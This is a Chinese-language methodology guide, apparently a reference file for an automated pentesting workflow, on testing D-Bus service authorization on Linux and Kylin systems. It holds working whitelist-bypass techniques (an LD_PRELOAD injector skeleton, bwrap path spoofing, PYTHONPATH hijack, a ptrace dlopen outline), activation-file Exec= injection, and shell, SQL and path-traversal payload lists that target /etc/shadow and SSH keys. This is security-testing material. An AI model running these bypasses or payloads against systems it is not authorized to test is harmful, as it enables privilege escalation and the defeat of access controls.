# D-Bus 接口授权测试

## 侦察命令

```bash
# 列出所有 D-Bus 服务（系统总线）
busctl list --system

# 列出当前用户的会话总线服务（GUI/桌面组件必查）
busctl --user list

# 枚举指定服务的所有接口和方法（系统总线）
busctl introspect <服务名> <对象路径>
# 会话总线服务
busctl --user introspect <服务名> <对象路径>

# 查看服务的 XML Policy 配置（系统总线 / 会话总线）
cat /etc/dbus-1/system.d/<服务名>.conf
find /etc/dbus-1/session.d /usr/share/dbus-1/services -name "*<服务名>*"

# 发现服务完整的对象路径树 —— 必须执行；根路径为空也要下钻
busctl tree <服务名>
busctl --user tree <服务名>

# 查看服务进程信息（PID、UID、可执行文件路径）
busctl status <服务名>
# 输出 PID=1234, UID=0, Command=/usr/libexec/kylin-nm-sysdbus
# → Command 路径用于探测无果时的二进制辅助分析（strings/strace/checksec）

# 查看 D-Bus 服务激活文件（服务名 → 二进制映射）
cat /usr/share/dbus-1/services/<服务名>.service
# [D-BUS Service]
# Name=org.kaiming.proxy
# Exec=/opt/kaiming-tools/bin/kaiming-sessionproxy-dbus
```

> **枚举完整性**：`introspect` 只对**单个对象路径**生效。一个服务名可挂多个对象路径/多个接口，必须 `busctl tree` 拿到全部路径后**逐路径 introspect**。典型陷阱：根路径 `/` 只返回 `Introspectable`/`Peer`（看似空壳），真正的接口挂在子路径下。

## D-Bus 安全三层控制

```
调用者 → dbus-daemon (XML Policy: /etc/dbus-1/system.d/*.conf)
              ↓
         服务进程 (polkit 检查 — 可选，很多自研服务未集成)
              ↓
         SELinux/AppArmor (MAC 强制访问控制，最后防线)
```

> **适用范围**：上述三层**仅对"在总线上"的服务成立**。组件可以完全不走总线（点对点 / 直连），此时 daemon 侧的策略、limitCtl、polkit **全部缺席**——见下方「第三种拓扑：点对点（P2P）/ 直连 D-Bus」。

**关键攻击面**：polkit 是可选的。很多自研 D-Bus 服务未集成 polkit，意味着只要 XML Policy 允许，任何用户都能调用。快速检查：

```bash
cat /etc/dbus-1/system.d/<service>.conf | grep -A5 'context="default"'
# 跨用户（非交互：先 sudo -n true 探测，不可免密用 setpriv --reuid=65534 --regid=65534 --clear-groups）
sudo -u nobody dbus-send --system --print-reply --dest=<service> <object> <interface>.<method>
```

---

## 会话总线（用户总线）测试

GUI/桌面组件优先测会话总线——**权限模型与系统总线完全不同**：

| 对比项 | 系统总线 | 会话总线 |
|--------|---------|---------|
| 访问控制 | XML Policy（`/etc/dbus-1/system.d/`）+ 可选 polkit/limitCtl | **默认按 UID 隔离：同一用户的任意进程均可调用** |
| 服务所有者 | 常为 root 守护进程 | 常为登录用户进程 |
| 典型攻击面 | 越权（普通用户 → root） | 同域信任边界（不可信输入 / 同机受限进程 → 用户上下文危害） |

```bash
# 枚举
busctl --user list
busctl --user tree <服务名>
busctl --user status <服务名>
busctl --user introspect <服务名> <对象路径>

# 普通用户调用（同域任意进程均可）
busctl --user call <服务名> <对象路径> <接口> <方法> <参数>
```

要点：

- 会话总线服务**没有"未授权"概念**（同 UID 即可调用），判定重心从"能否调用"转为"调用后能造成什么"（参数注入、持久化污染、触发高权限分支）。
- 会话总线做不到跨用户/提权，属**同权限域缺陷**——严格模式下不计入漏洞；如需产出，须先经 SKILL.md「可选扩展模式」取得用户确认。**但该结论仅对"确实在总线上"的服务成立**：组件可能同时、或改为在抽象套接字上做点对点 D-Bus，那里跨用户**成立且可测**（见下方「第三种拓扑」）。
- Qt 应用自动导出 `org.qtproject.Qt.QWidget` 等接口，可直接触发关闭/退出代码路径（见本文件「对象路径 × 接口 × 方法全量枚举」）。
- 与 [component-discovery.md](component-discovery.md) A3 的会话总线 diff、[cap-analysis.md](cap-analysis.md) 的 Qt 插件目录劫持配合使用。

---

## 第三种拓扑：点对点（P2P）/ 直连 D-Bus（无 daemon）

前面两节都假定服务**在总线上**。组件也可以完全不走总线：自己 `bind()` 一个套接字、用 `GDBusServer` 直接接受连接（点对点 / 直连）。此时 **XML Policy、limitCtl、polkit 全部缺席**——没有 daemon 去执行它们。

### 拓扑判定（先定拓扑，再决定测什么）

| 拓扑 | 谁能**连上** | 门禁在哪 | 发现命令 |
|------|-------------|---------|---------|
| 系统总线 | **所有人** | **daemon 的策略层**（`system.d/*.conf` + limitCtl + polkit） | `busctl --system list` |
| 会话总线 | **只有属主**（`/run/user/<uid>` 是 `0700`） | **传输层**（文件系统权限） | `busctl --user list` |
| **点对点 / 直连** | **所有人**（抽象套接字） | **只能靠服务自己校验对端 uid** | **`ss -xlnp`（`busctl` 看不到！）** |

```bash
# 1. busctl 找不到 ≠ 没有服务 —— 必须继续往下查
busctl --system list | grep -i <关键字>
busctl --user   list | grep -i <关键字>
# 2. 找它自己的 socket（抽象套接字对 busctl 完全不可见）
ss -xlnp 2>/dev/null | grep '@'                  # @ 打头 = 抽象套接字
# 3. 判定绑定方式（二进制层）
strings -a <二进制> | grep -E 'g_dbus_server_new_sync|GDBusServer'   # 命中 → P2P 服务端
strings -a <二进制> | grep -E 'g_bus_get_sync|g_bus_own_name'        # 命中 → 走总线
```

### 抽象套接字（`unix:abstract=`）

- 名字活在**内核抽象命名空间**，`bind()` **不创建文件** → 没有 inode / mode / owner → **内核跳过权限检查**。
- 名字**可以包含 `/`**，因此长得像路径却根本不存在：`unix:abstract=/tmp/.<name>-<uid>.sock` 用 `ls` 是找不到的。
- `ss -xlnp` 里以 **`@` 打头**即抽象；`find -type s`、`ls -la` **永远看不到它**。
- 唯一可能的补救：服务端自己校验**对端凭证**。
- 正确做法（对照）：**文件系统套接字 + per-uid `0700` 目录** —— 这正是会话总线隔离的本体，`connect()` 会因父目录不可穿越而报 `Permission denied`。

### 判定：唯一门禁是「有无对端 uid 校验」

点对点服务**拿得到**对端身份（内核在连接建立时提供 `SO_PEERCRED`：pid/uid/gid，不可伪造），问题只在于它**查不查**：

| 绑定 | 校验符号（**导入 = 有能力校验；未导入 = 不具备校验能力**）|
|------|--------------------------------------------------------|
| GLib | `g_credentials_get_unix_user`（`g_dbus_connection_get_peer_credentials` 只"取"，不"判"）|
| sd-bus | `sd_bus_creds_get_euid` / `sd_bus_query_sender_privilege` / `sd_bus_query_sender_creds` |
| 裸 socket | `getsockopt(SO_PEERCRED)` |

```bash
# 静态：判断它有没有能力校验
objdump -T <二进制> | grep UND | awk '{print $NF}' | grep -E 'credentials|creds_get|SO_PEERCRED'
strings -a <二进制> | grep -E 'g_credentials_get_unix_user|sd_bus_creds_get_euid'
```

> **反模式**：日志里出现 peer credentials（如 `Client connected. Peer credentials: ...uid=65534`）**不等于**做了校验——"拿到只打印"是这类服务的常见形态，必须回到符号层确认是否真的存在 uid 比对。

### 测试：跨用户连接

```bash
# 步骤 0：服务运行身份（决定边界性质）
ps -o uid,user,pid,cmd -C <进程名>
#   以 uid N 的 user 服务运行 → 边界是「用户 ↔ 用户」，不是 → root

# 步骤 1：确认监听在抽象套接字
ss -xlnp 2>/dev/null | grep '<socket 关键字>'

# 步骤 2：本用户连接（基线，应成功）
#   注意：P2P 不走总线，不能用 busctl，只能用 new_for_address_sync
python3 - <<'EOF'
import gi; gi.require_version('Gio', '2.0')
from gi.repository import Gio, GLib
c = Gio.DBusConnection.new_for_address_sync(
        'unix:abstract=<套接字名>',
        Gio.DBusConnectionFlags.AUTHENTICATION_CLIENT, None, None)
r = c.call_sync(None, '<对象路径>', '<接口>', '<方法>',
                GLib.Variant('(s)', ('',)), None, Gio.DBusCallFlags.NONE, 5000, None)
print(r.unpack())
EOF

# 步骤 3：换用户连接（跨用户测试；非交互：先 sudo -n true，不可免密改
#          setpriv --reuid=65534 --regid=65534 --clear-groups python3 <同上脚本>）
sudo -u nobody python3 <同上脚本>
#   成功 → 服务日志会出现对端 uid（如 uid=65534）→ 跨用户边界突破
```

**判定**：

| 换用户连接的结果 | 含义 |
|-----------------|------|
| **成功且方法可调** | **跨用户未授权访问成立**（CWE-862） |
| `Permission denied`（EACCES） | 被传输层挡住（文件系统套接字 / `0700` 目录）→ 边界成立 |
| **`Connection refused`（ECONNREFUSED）** | **没有监听者，不是"被拒绝"** → 必须重查服务状态，**不得记为安全结论** |

### 三个陷阱

1. **`ECONNREFUSED` ≠ 拒绝**：抽象套接字的 `ECONNREFUSED` 只表示**无监听者**。按需 / D-Bus-activated 的 user 服务常在客户端断开后自停（journal 里 `service timer expired` → `stopping service`），于是**紧接的第二个探测就会撞上它**。
   → 探测顺序敏感：**跨用户探测排在第一个**；每步前后重查 `systemctl --user is-active <服务>` + `ss -xlnp`。
2. **"方法可调用" ≠ "影响已证实"**：两件事必须**分开取证**。可调用 = 授权缺陷成立；**机密性/完整性影响必须用实际返回值或副作用证明**——查询返回空 `[]`、写/删操作返回 `issuccessful:false`，都**不能**算影响已证实。
3. **定级不按理论最大**：user 服务跨用户 = **跨权限域（可越权）**，`S:C` 成立；`C`/`I` 按**实际取到的数据 / 真正改变的状态**定。可调用但无数据、无副作用 → 取低档。

### 修复方向（写报告用）

- 改用**文件系统套接字 + per-uid `0700` 目录**（照会话总线的隔离模型，让传输层挡人）；或
- 在 `onNewConnection` 里取得对端 uid 并与自身 uid 比对，不一致即断开（`g_credentials_get_unix_user(creds, NULL) != getuid()`）。

---

## 白名单管控识别（麒麟 limitCtl）

XML Policy 之外还有第四层管控：dbus-daemon 补丁版 limitCtl 按调用方**进程路径**做白名单。

```bash
# 受控标志：任一存在即受控
ls /etc/dbus-1/conf/<总线名>.limit /etc/kylin-config/basic/<服务>.yaml 2>/dev/null
grep -E '^\[|=' /etc/dbus-1/conf/<总线名>.limit 2>/dev/null   # 看 [whitelist]/[rootcontrol]/[auth]
```

普通用户调用被拒时的报错分层：

| 报错 | 含义 |
|------|------|
| `operation not permitted -- Invalid client identity` | 身份层：cmdline/exe 路径不在 `[whitelist]` |
| `auth forbidden` | auth 层：严格服务校验真实 exe inode 不符，或 `[auth] RootOnly=true` |

- 无任何管控配置的服务 → 直接测未授权调用，不存在绕过问题。
- 确认管控后才按下节「白名单管控绕过（四法）」选方法（LD_PRELOAD 优先）；`RootOnly`/`rootcontrol=on` 客户端侧无解，直接放弃。

---

## 白名单管控绕过（四法，确认受控后才用）

### 何时绕（约束）

**只有确认目标服务存在白名单管控时才进入本节，不要上来就绕。** 无管控配置的服务直接按标准流程测未授权调用。

先定性：

1. **受控标志**：`/etc/dbus-1/conf/<总线名>.limit` 或 `/etc/kylin-config/basic/<服务>.yaml` 任一存在（内含 `[whitelist]`/`[rootcontrol]`/`[auth]`/`[envwhitelist]` 段）。
2. **报错分层**：`operation not permitted -- Invalid client identity` = 身份层（cmdline/exe 路径不在白名单）；`auth forbidden` = auth 层（严格服务追加校验，或 `[auth] RootOnly=true`）。
3. **攻击面本质**：身份层匹配的是**进程视角的路径字符串**（`/proc/pid/exe`、`/proc/pid/cmdline`），可伪造；严格服务追加 **inode 比对**（路径伪造无效），必须让进程真实运行白名单文件本身。

### 方法选型（LD_PRELOAD 优先）

| 场景 | 方法 |
|------|------|
| 白名单含非 setuid、world-exec 的真实 ELF | **① LD_PRELOAD**（严格+宽松通吃，首选） |
| 严格服务且 env 注入被 LSM 在 exec 期拦截 | **④ ptrace 注入** |
| 宽松服务（仅 cmdline 校验），白名单为任意路径 | **② bwrap 路径欺骗** |
| 宽松服务 + 白名单项是 shebang→python 脚本 | **③ PYTHONPATH 劫持** |

严格/宽松判别：`[rootcontrol] status=off` 或仅 yaml 配置多为宽松（只认 cmdline）；whitelist-only 配置多为严格（还认 inode）。不确定时先用 ②/③ 只读探针试一次定性（被拒=严格，转 ①）。

### ① LD_PRELOAD 注入（首选）

原理：代码注入白名单真实 ELF 进程内，进程真实 exe 就是白名单文件，身份层与 auth 层天然双满足。

```bash
gcc -shared -fPIC -o /tmp/inj.so inj.c -ldl
LD_PRELOAD=/tmp/inj.so /usr/sbin/<白名单ELF>   # 非 setuid、world-exec
```

inj.c 关键骨架（constructor 内完成全部动作）：

```c
__attribute__((constructor)) static void init(void){
    for (char **e = environ; e && *e; e++)                     // 构造期抹除 LD_*：
        if (!strncmp(*e, "LD_", 3)) memset(*e, 0, strlen(*e)); // 服务查 /proc/pid/environ 时已是干净内存
    void *h = dlopen("libdbus-1.so.3", RTLD_NOW|RTLD_GLOBAL);  // 必须运行时 dlopen
    // dbus_bus_get(SYSTEM) → dbus_message_new_method_call →
    // dbus_message_append_args → dbus_connection_send_with_reply_and_block
    // 完成dbus调用后 _exit(0)
}
```

注意：libdbus 符号不能链接期 extern（undefined symbol 被吞、.so 静默加载失败），必须 dlopen 运行时解析。
局限：目标为 setuid 时 AT_SECURE 忽略 LD_PRELOAD；LSM 在 bprm/exec 阶段拒绝 LD_* env 时失效 → 转 ④。

### ② bwrap 路径欺骗（宽松服务）

原理：把自选可执行 bind-mount 到白名单路径再 exec，服务端读到的 `/proc/pid/exe` 与 `cmdline[0]` 均为白名单路径字符串；`--clearenv` 顺带清空 env（无 LD_PRELOAD 痕迹）。

```bash
bwrap --ro-bind / / --bind /run /run --bind /tmp /tmp --clearenv \
      --bind /usr/bin/python3 "$WHITELIST_EXE" \
      -- "$WHITELIST_EXE" "$INNER_SCRIPT"
```

局限：真实 inode 未变，严格服务（inode 比对）必拒；完整 PoC 见 poc-template.py 变体 `bwrap_whitelist_bypass`。

### ③ PYTHONPATH 劫持（宽松服务，限 python 脚本白名单项）

原理：白名单项为 shebang→python 脚本时，进程 `cmdline[1]`=脚本路径命中身份层；PYTHONPATH 目录优先级高于系统库，恶意同名包在 import 时执行，以白名单脚本身份**进程内**直接调 D-Bus。

```bash
mkdir -p evil/<脚本import的包名>
echo '<进程内 Gio/dbus 调用目标方法>' > evil/<包名>/__init__.py
PYTHONPATH=$PWD/evil /usr/bin/<白名单脚本>
```

注意：必须造包级 `__init__.py` 抢 sys.path 优先级，纯子包路径不生效。
局限：仅限 python 解释器的 shebang 项，且脚本需 import 可抢占模块；严格服务被 inode 比对拒。

### ④ ptrace 注入（env 向量被封时的替补）

原理：干净 exec 白名单 ELF（env 全程无 LD_*，exec 期 env 检查无物可查）→ 附加 → 远程 mmap + 写入路径串 → 远程调 `__libc_dlopen_mode("/tmp/inj.so")` → 之后同 ①；恢复寄存器后 DETACH，宿主继续正常运行。

```c
// 子进程: clearenv(); setenv("PATH","/usr/bin",1);
//         ptrace(PTRACE_TRACEME); execl(白名单ELF);
// 父进程: waitpid → PTRACE_GETREGS 存档 → 远程 call mmap(RWX)
//         → PTRACE_POKEDATA/process_vm_writev 写 "/tmp/inj.so"
//         → 远程 call __libc_dlopen_mode(addr, RTLD_NOW)
//         → 恢复原始 regs → PTRACE_DETACH
```

`__libc_dlopen_mode` 地址 = 注入器 dlsym 偏移 + 目标 `/proc/pid/maps` 中 libc 基址（同机同 glibc 通用）。
局限：Yama（`kernel.yama.ptrace_scope`）限制跨进程附加；LSM 可在 ptrace 钩子拦截；目标 setuid 需 root。

### 死路清单（勿浪费时间）

- 包裹式 bwrap（不换路径包 busctl）、`exec -a` 改 argv0、prctl 改 comm、userns `--unshare-user --uid 0` —— 只改表象，任何服务都不认。
- patchelf/复制白名单 ELF 后修改执行 —— 破坏真实 inode，严格服务必拒。
- 显式 root 强制（`[auth] RootOnly=true` / `[rootcontrol] status=on`）—— 客户端侧无解，换目标。
- 对**点对点 / 抽象套接字**服务尝试绕白名单——它不挂总线，**根本没有 daemon 侧管控可以绕**（见上方「第三种拓扑」）。

---

## D-Bus 激活文件注入（`Exec=` / `User=`）

服务激活文件 `/usr/share/dbus-1/system-services/<服务>.service` 决定"谁、以什么命令"被 dbus-daemon 拉起。它本身就是一个攻击面：

```bash
# 1. 找到激活文件（组件边界内）
ls -la /usr/share/dbus-1/system-services/<服务>.service /etc/dbus-1/system-services/<服务>.service 2>/dev/null

# 2. 权限基线：普通用户可写？
[ -w <激活文件> ] && echo "可写 → 直接注入 Exec="

# 3. 内容检查：Exec= 是否含可注入变量/相对路径/可写脚本
grep -E '^(Exec|User|SystemdService)=' <激活文件>
#   Exec=/bin/sh -c '<命令>'        ← sh -c 即 shell，含变量即注入面
#   Exec=/opt/<组件>/scripts/run.sh ← 脚本本身可写？(检查脚本权限)
#   User=root                       ← 以 root 拉起
```

- **激活文件可写** → 改 `Exec=` 为任意命令（如 `/bin/sh -c 'touch /tmp/inj-marker;#'`），再触发一次该服务的任意方法调用（dbus-daemon 会拉起它）→ marker + owner uid 取证。
- **`Exec=` 指向的脚本/包装器可写**（组件包内的 launcher）→ 注入脚本内容，效果同上。
- 归属校验：激活文件必须以组件唯一标识命名才可测；否则归"关联观察"。

---

## 二阶（存储型）注入的四个要点

判定方法见上方「参数签名与注入探测」第 3 条；实操要点：

- **载荷写法**：被拼进 shell 时用 `${IFS}` 替代空格（`;touch${IFS}/tmp/x;#`），并单独校验载荷字段确已落盘。
- **门控顺序不预设**：不假定"先注入再开闸"还是"先开闸再注入"，按实测行数/报错为准并记录证据（固定的顺序断言曾被他机证伪）。
- **触发接口**：Qt 应用可用会话总线自动导出的 `org.qtproject.Qt.QWidget.close()` 触发关闭/退出路径，**无 GUI 交互即可完成整链**。
- **权限边界**：结果通常为登录用户权限（不可越权）——报告须标注，并遵守 SKILL.md「可选扩展模式」的产出约定。完整模板见 poc-template.py 变体 `second_order_injection`。

---

## 步骤 0：权限基线（必须先做）

在测试任何 D-Bus 方法之前，先建立权限基线：

### 0.1 查看 XML Policy 的默认权限

```bash
# 查看服务的默认访问策略
cat /etc/dbus-1/system.d/<service>.conf | grep -A10 'context="default"'

# deny + 特定用户 allow → 普通用户被拒绝
# allow + 无限制 → 任何用户都能调用
```

### 0.2 查看对应 PolicyKit action（如果有）

```bash
# 查找服务关联的 PolicyKit action
pkaction | grep -i <service>

# 查看 action 的默认权限
pkaction --action-id <action> --verbose | grep implicit
# implicit inactive: yes → 非活跃会话无需认证
# implicit inactive: auth_admin_keep → 需要管理员认证
```

### 0.3 记录基线结论

```
基线结论：[该 D-Bus 方法默认需要认证] / [该方法默认允许普通用户调用]
如果为"默认允许普通用户" + 方法本身为普通用户设计 → 停止测试，判定为非漏洞
如果为"默认需要认证" → 继续测试，验证能否绕过
```

---

## 高危操作关键词映射

**重要前提**：遇到不认识的术语时，先搜索了解其 Linux 背景再定级。关键词匹配不到的才是最容易漏的。

### 直接关键词匹配

| 方法名关键词组合 | 风险 | 对应 Linux 操作 |
|-----------------|------|----------------|
| `clear`/`delete`/`remove`/`reset` + `audit`/`log`/`operations` | **P0** | 清除审计日志 (`truncate /var/log/audit/audit.log`) |
| `delete`/`remove` + `user`/`account` | **P0** | 删除用户 (`userdel`) |
| `disable`/`stop`/`close`/`turnoff` + `security`/`selinux`/`firewall`/`mfa`/`otp`/`verify`/`sign`/`audit` | **P0** | 关闭安全机制 (`setenforce 0`, `systemctl stop firewalld`) |
| `unbind`/`unlink` + `ukey`/`otp`/`mfa`/`token`/`key` | **P0** | 解绑认证设备，绕过 MFA |
| `write`/`create` + `file`/`config`/`system` | **P0** | 写入系统文件 |
| `create` + `user`/`admin`/`root` | **P0** | 创建特权用户 (`useradd`) |
| `set`/`update`/`change`/`modify` + `password`/`config`/`policy`/`uid`/`gid`/`sysctl`/`grub` | **P1** | 修改系统/安全配置 |
| `mount`/`load` + `module`/`driver` | **P1** | 挂载/加载内核模块 (`modprobe`, `mount`) |
| `start`/`restart`/`enable` + `service`/`daemon` | **P2** | 启停服务 |
| `get`/`list`/`query`/`status`/`dump`/`export` + 敏感对象名 | **P3→P1** | 查询类，若返回密码/密钥/令牌则升级为 P1 |

### 麒麟/国产系统特有

| 关键词 | 对应组件 |
|--------|---------|
| `kysec`/`secpolicy` | KYSEC 安全框架 |
| `secadmin`/`audadmin`/`sysadmin` | 三权分立 |
| `ukey`/`otp`/`mfa` | 认证设备 |
| `appwhitelist`/`trustedapp` | 应用白名单 |
| `usbpolicy`/`devicepolicy` | 外设管控 |
| `tcm`/`tpm`/`measure` | 可信度量 |

### 容易被忽略的高危术语（需搜索确认背景）

这些术语看着不敏感但实际都是 root-only 特权操作，遇到必须查：

| 术语 | 实质 | 风险 |
|------|------|------|
| `CGROUP` | 内核 cgroup 资源控制 | 修改可导致 DoS/资源逃逸 |
| `Namespace` | 内核 namespace 隔离 | 修改可导致容器逃逸 |
| `Capability`/`CAP_*` | Linux capabilities 权限模型 | 授予权限可提权 |
| `Seccomp` | 内核 seccomp 沙箱 | 修改可绕过系统调用过滤 |
| `BPF`/`eBPF` | 内核 BPF 虚拟机 | 加载恶意程序可提权 |
| `Netlink` | 内核 netlink 通信 | 可操作网络/路由配置 |
| `SELinux`/`AppArmor` | MAC 强制访问控制 | 关闭即安全机制失效 |
| `Polkit`/`PolicyKit` | 权限授权框架 | 修改规则可提权 |
| `Init`/`systemd` | 系统初始化/服务管理 | 修改 unit 可持久化 |
| `Kernel`/`Module` | 内核/内核模块 | 加载模块可执行任意代码 |

若服务名或方法名包含以上术语但不在直接关键词匹配表中 → **同样按 P0/P1 处理**。

---

## 漏洞模式与测试决策树

### 模式 1：高危操作无鉴权
方法名本身说明其功能属于高危操作（见上表），普通用户直接调用成功即漏洞。

### 模式 2：敏感信息泄露

`Get`/`List`/`Dump`/`Export` 开头的方法可能返回密码、密钥、令牌等敏感数据。按返回**内容**定级，**不一律降 P3**：

| 返回内容 | 定级 | 说明 |
|---------|------|------|
| 凭据/密钥/令牌 | P1（C:H） | 直接可利用 |
| 用户名/UUID/路径/操作时间线 | P2（C:L） | 见 SKILL.md「信息泄露专项」B 类；若为另一漏洞必要输入则 C 类交叉引用 |
| 公开/非敏感 | P3 | 设计公开，写一行"非漏洞" |

测试：`busctl … <方法>` 看返回；返回可读但属敏感时，按 SKILL.md 三分类编号，**不静默丢弃**。

### 测试决策树

```
发现 D-Bus 方法
  │
  ├─ 含 clear/delete/remove/reset? → P0 → 测普通用户能否调用
  ├─ 含 disable/stop/close/turnoff? → P0 → 测是否关闭安全机制
  ├─ 含 unbind/unlink?              → P0 → 测是否解绑认证设备
  ├─ 含 write/create?               → P0 → 测是否写入系统文件
  ├─ 含 set/update/change/modify?   → P1 → 测是否需要鉴权
  ├─ 含 get/list/dump/export?       → P3 → 测返回是否含敏感信息（内容定级见「模式 2」：凭据→P1、用户名/UUID→P2，不一律 P3）
  └─ 参数拼进 SQL/命令字符串?       → 注入 → 一阶/二阶（见「参数签名与注入探测」）
```

---

## 对象路径 × 接口 × 方法全量枚举

**规则：枚举必须穷尽，逐个调用并成表记录。**

```bash
# 1. 拿全部对象路径
busctl tree <服务名>              # 系统总线；会话总线加 --user
# 2. 逐路径枚举接口与方法签名
for p in <全部对象路径>; do busctl introspect <服务名> "$p"; done
# 3. 对每个方法按签名以普通用户身份逐个调用，记录返回值/报错分层
```

记录表：

| 服务 | 对象路径 | 接口 | 方法 | 签名 | 普通用户可达 | 初步定级 |
|------|---------|------|------|------|-------------|---------|

**三个必须遵守的点**：

1. **根路径空 ≠ 安全**：`introspect <服务> /` 只返回 `Introspectable`/`Peer` 时，必须用 `busctl tree` 下钻全部子对象路径——接口常挂在子路径下。
2. **空壳服务名也要看**：与组件同名/近似的服务名即使根路径为空，也先 `tree` 一遍再判定。
3. **Qt 自动导出接口**：任何 Qt 应用都会把 `QWidget` 导出到会话总线（`org.qtproject.Qt.QWidget`，方法如 `close()`/`show()`/`hide()`），**无需组件自行注册**，是零成本触发面——常可用来触发应用的"关闭/退出"分支（`close()` → `QWidget::close` → `QCloseEvent` → `closeEvent()`，而 `closeEvent` 内又可能 emit 信号触发清理/删除槽）。**拿到方法入口后必须一路回溯到 sink**（见 SKILL.md「可达性回溯：疑似 sink → 攻击者入口」）——不要因为某函数（如 `clearList`）没有直接 `call` 就判定不可达。
4. **声明 ≠ 可调用**：`introspect`/XML 可能是**静态或夸大**的（如 Qt Adaptor 返回硬编码 XML，或自定义类型未注册元信息）。逐方法**实测**调用，并记录"声明存在但运行时返回 `UnknownMethod`"的方法——它们对攻击面是**收窄**（不可被滥用），但仍须在报告中标注，避免下次误以为可达。

---

## 参数签名与注入探测（逐字段 fuzz）

### 调用即注入（与未授权调用合一）

**未授权调用时即注入**：按命名推测功能、以普通用户调用危险方法时，**字符串实参直接用注入载荷**——一次调用同时回答"是否未授权"与"是否注入"，通常几分钟即定论（逆向只用来解释结果，不用来下判定；只定位，不做全面反汇编/函数边界/变量追踪，先枚举输入形状）。**返回 AccessDenied 则注入无意义**（先解决鉴权，见本节末）。此步先于任何静态分析：

```bash
# 对每个 s / as(逐元素) / a{sv}(键与值) / struct 成员，依次尝试（一次一字段）：
#   ① 分号形    :  <val>;  touch /tmp/inj_<tag>; #
#   ② 引号逃逸  :  <val>'; touch /tmp/inj_<tag>; #     ← 模板把参数包进单引号时用
#   ③ 替换形    :  <val>$(touch /tmp/inj_<tag>)   及反引号形
#   ④ 空格替代  :  ;touch${IFS}/tmp/inj_<tag>;#
#   ⑤ 换行形    :  <val>␊touch /tmp/inj_<tag>
# 每发之后核对：marker 是否出现 + owner uid 是否等于服务运行身份（root）
```

载荷选形取决于被拼模板的**引号方式**：
- 模板 `%1` **未加引号** → 直接用 `;` / `$( )` / 反引号；
- 模板 `'%1'` **在单引号内** → 用 `'` 逃逸（`x'; cmd; #`）；**注意未闭合的 `'` 会把余串吞进引号造成假阴性**；
- `#` 用于截断余串。

**原则：每个字段单独测**。数组/结构体逐元素替换，一次只改一个字段，观察返回与副作用。

| 签名 | 含义 | fuzz 关注点 |
|------|------|-----------|
| `s` | string | 注入载荷、超长、空串、编码绕过 |
| `as`/`ay` | 数组 | **逐元素替换**（每个元素都可能是独立拼接点） |
| `a{sv}` | 字典 | 键名与值都可能被拼进 SQL/配置 |
| `struct` | 结构体 | 逐成员替换 |
| `i`/`u`/`x` | int/uint/int64 | 边界值 (-1, 0, MAX)、负值、超大值 |
| `b` | boolean | 翻转测试 |

**注入载荷清单**（按消费端选择；shell 五形已在上方「调用即注入」给出，不重复）：

```bash
# SQL（被拼进 insert/update 且未参数化）
'   ;   ')--   ;   '||(select ...)--
# 路径遍历
../../../etc/shadow   ;   ../../../../root/.ssh/id_rsa
# 格式化字符串
%s%s%s%s%n
# 超长 / 边界
<100KB 字符串>   ;   空串   ;   纯空白
```

**判定方法**：

1. **拼接点识别**：参数被拼进 SQL / 命令字符串（未转义、未参数化）即构成注入。通过报错回显（SQL 语法错误、`sh: ...: not found`）或副作用观测确认。
2. **一阶注入**：载荷当次调用即被消费（如直接拼进 `system()`）→ 直接观测系统级效果。
3. **二阶（存储型）注入**：载荷先写入持久化（数据库/配置/文件），随后由**另一个接口、另一次启动或另一个进程**消费——**注入点与触发点分离**。必须验证三件事：① 载荷确已落盘；② 确认被重载（重启/重连后仍在）；③ 找到消费它的触发路径。
4. **配置门控维度**：触发路径常被**默认关闭**的配置开关门控（**不举例具体键名**）。**不预设先后顺序，按实测验证**——"先开闸再注入"与"先注入再开闸"都可能成立，以实测行数/报错为准；若入口确因门控拒写，再调整顺序并**记录实测证据**（行数、报错）。门控溯源（键字符串 → 全局偏移 → 判定分支）见 SKILL.md「可达性回溯」。
5. **汇合点验证**（不依赖返回值）：用系统级标记（约定 `/tmp/inj_<tag>`，单点 `/tmp/inj-marker`）并核对 `owner uid`；用 `strace -f -e trace=execve` 观测是否真的出现 `sh -c` / `rm` / `touch`。**不要只看接口返回值**。

### 否定结论的证据标准

判"无注入"必须**同时**满足：

1. 全部字符串参数都打过载荷（含数组逐元素、字典键与值）；
2. 能证明**载荷确已到达执行点**——三选一：
   - 组件日志/回显中出现**构造后的完整命令**（含载荷）；
   - `strace -f -e trace=execve -p <pid>` 观测到目标真的执行（或尝试执行）了外层命令；
   - 补齐前置条件（所需文件/配置/参数）后重发，仍无 marker。

**载荷因前置失败（如打不开所需文件、连接被拒）提前返回 → 结论是"无效（inconclusive）"，不是"无注入"**；须补齐前置重测或换入口，不得据此关闭问题。

### 是否经 shell：逐汇点判定，禁止外推

同一二进制内**不同汇点可用不同执行方式**，注入性必须逐汇点按其**实际调用形式**判定：

| 调用形式 | 是否经 shell | 注入性 |
|---------|-------------|--------|
| `QProcess::start(QString)` / `QProcess::execute(QString)` | **否**——Qt 按空格切分成 argv 后直接 execve，`;`/`&&`/`$()` 只是普通参数 | 参数型操纵（路径/属主/选项），**无命令注入** |
| `QProcess::start(program, QStringList args)` | 否（参数显式给定） | 同上 |
| `system()` / `popen()` / `QProcess::start("sh"/"bash", {"-c", <拼接串>})` | **是**——交给 shell 解析 | **命令注入成立** |
| `QProcess::start("bash", args)` 且 `-c` 内容含用户输入 | 是（`-c` 的内容被 shell 解释） | **命令注入成立** |

判定手段：**黑盒探测优先**（调用即注入）；静态仅用于解释（`objdump` 找 `lea "bash"` + `"-c"` 组合、`nm -D` 查 `system`/`popen` 导入；仅定位，不做函数边界/变量追踪）。**禁止以一个汇点的结论外推另一个汇点**。

**反模式**：不得以未验证的假设（如"自动清理疑似走了安全路径"）结束探测——"不可达"的结论必须有系统级证据。

如果普通用户调用已返回权限错误，注入测试无意义——先确认是否未授权访问。

---

## 验证命令速查

核心原则：**不依赖 D-Bus 返回值验证**，用系统级命令独立确认。

```bash
# --- 审计日志 ---
wc -l /var/log/audit/audit.log          # 行数是否归零
ausearch --format text | wc -l
systemctl status auditd

# --- 安全机制 ---
getenforce                               # SELinux
cat /sys/fs/selinux/enforce
systemctl status firewalld
grep gpgcheck=0 /etc/yum.repos.d/*.repo  # 签名验证是否关闭

# --- 用户管理 ---
id <username>
grep <username> /etc/passwd /etc/shadow
echo "<pwd>" | su - <username> -c "exit"; echo $?

# --- 认证设备 ---
ls -la /etc/ukey/bindings/ /etc/otp/ /var/lib/otp/ 2>/dev/null
grep -r "pam_google_authenticator\|pam_duo" /etc/pam.d/

# --- SSH / PAM 配置 ---
